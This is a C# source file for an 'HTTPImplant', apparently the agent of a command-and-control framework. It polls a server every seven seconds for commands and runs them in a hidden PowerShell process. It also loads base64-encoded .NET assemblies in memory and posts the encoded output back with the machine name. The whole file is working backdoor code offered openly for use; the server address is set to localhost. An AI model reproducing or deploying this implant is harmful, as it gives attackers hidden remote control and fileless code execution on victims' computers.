using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Text;
using System.Timers;
using HTTPImplant.Modules;

namespace HTTPImplant
{
    // This Implant class acts as the entry point of the implant program.
    public class Implant
    {
        public string host { get; set; }  // Host of the implant server
        public string port { get; set; }  // Port of the implant server
        private static string lastCommandExecuted = string.Empty; // Store the last command that was executed

        // Main method that is executed when the program is started.
        public static void Main(string[] args)
        {
            string implantId = Environment.MachineName; // The ID of the implant is set as the machine's name
            var webClient = new WebClient(); // WebClient for communication with the server

            // Timer set to 7 seconds, checks the server for commands to execute.
            var checkForCommandTimer = new System.Timers.Timer(7000); 
            checkForCommandTimer.Elapsed += (sender, e) =>
            {
                webClient.DownloadStringAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));
            };
            checkForCommandTimer.AutoReset = true;
            checkForCommandTimer.Enabled = true;

            // Event handler for when the WebClient finishes downloading the string
            webClient.DownloadStringCompleted += (sender, e) =>
            {
                if (e.Error == null)
                {
                    string jsonResponse = e.Result; // The response from the server

                    Command command = new Command();
                    // Parse the JSON response to the Command object properties
                    command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
                    command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
                    command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
                    command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
                    command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"File" }, StringSplitOptions.None)[1];
                    command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
                    command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\"}" }, StringSplitOptions.None)[1];

                    // If the received command is the same as the last one executed, it's ignored.
                    if (command.command == lastCommandExecuted)
                        return;

                    lastCommandExecuted = command.command;

                    // Depending on the command input, different actions are performed
                    if (command.Input.Contains("os"))
                    {
                        // Start a PowerShell process with the command
                        ProcessStartInfo processStartInfo = new ProcessStartInfo
                        {
                            FileName = "powershell.exe",
                            Arguments = "-NoLogo -NonInteractive -NoProfile -Command " + command.command,
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        Process process = new Process
                        {
                            StartInfo = processStartInfo
                        };
                        process.Start();

                        // Read the process output and send it back to the server
                        string output = process.StandardOutput.ReadToEnd();
                        process.WaitForExit();
                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                        SendResult(webClient, implantId, command.Operator, outputBase64);
                    }
                    else if (command.Input.Contains("execute-assembly"))
                    {
                        // If the command is to execute an assembly, the assembly is executed and its output is sent back to the server
                        byte[] bytes = Convert.FromBase64String(command.File);
                        string output = ExecuteAssembly.Execute(bytes);
                        string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                        SendResult(webClient, implantId, command.Operator, outputBase64);
                    }
                }
            };

            // Start checking for commands from the server
            webClient.DownloadStringAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));

            // Keeps the console open to ensure that async tasks complete
            Console.ReadLine();
        }

        // Sends the results of the command execution back to the server
        public static void SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64)
        {
            string resultJson = "{" + "\"ImplantId\": \"" + implantId + "\"," + "\"OperatorId\": \"" + operatorId + "\"," + "\"Output\": \"" + outputBase64 + "\"," + "\"DateFromLast\": \"" + DateTime.UtcNow.ToString("O") + "\"" + "}";
            webClient.UploadStringCompleted += (sender2, e2) =>
            {
            };
            webClient.UploadStringAsync(new Uri("http://127.0.0.1:8081/fetchOutput"), "POST", resultJson);
        }
    }

    // The Command class represents a command that is sent from the server.
    public class Command
    {
        public string Input { get; set; }
        public string ImplantUser { get; set; }
        public string Operator { get; set; }
        public string TimeToExec { get; set; }
        public string Delay { get; set; }
        public string File { get; set; }
        public string command { get; set; }
    }
}
